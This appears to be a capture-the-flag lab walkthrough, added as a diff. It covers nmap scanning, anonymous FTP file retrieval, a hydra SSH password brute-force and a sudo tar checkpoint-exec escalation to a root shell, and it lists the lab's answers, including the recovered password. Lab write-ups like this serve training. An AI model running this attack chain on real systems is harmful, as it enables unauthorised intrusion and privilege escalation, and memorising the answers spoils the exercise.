@@ -1,0 +1,33 @@
+1. deploy the machine 
+2. find the open ports using nmap
+   nmap -sS ip
+   http,ftp,ssh
+3. check for anonymous login in ftp
+   nmap -A  ip
+   anonymous login allowed 
+4. ftp ip
+   get task.txt
+   get locks.txt
+5. cat task.txt
+   "lin" answer for 3rd question
+6. use "locks.txt" as worlist attack on "ssh" (answer for 4th question) using hydra 
+   we know the username already "lin"
+   hydra -l lin -P locks.txt $ip -t 20  ssh
+   "RedDr4gonSynd1cat3" answer for 5th question and it is "lin" user  "ssh" password
+7. login "lin" user through "ssh"
+   ssh lin@ip
+8. you got the "lin" user
+   look for "user.txt"
+   cat user.txt
+   you got the user flag
+9. look "lin" user privilege using command
+   sudo -l
+   in lin user tar is execute as root
+10. privilege escalation 
+    echo "cat /root/root.txt" > exp
+    sudo tar cf /dev/null exp --checkpoint=1 --checkpoint-action=exec=/bin/sh
+    now you got the root shell using "id" command we can check it 
+    cat /root/root.txt
+    now you got the root flag 
+
+   
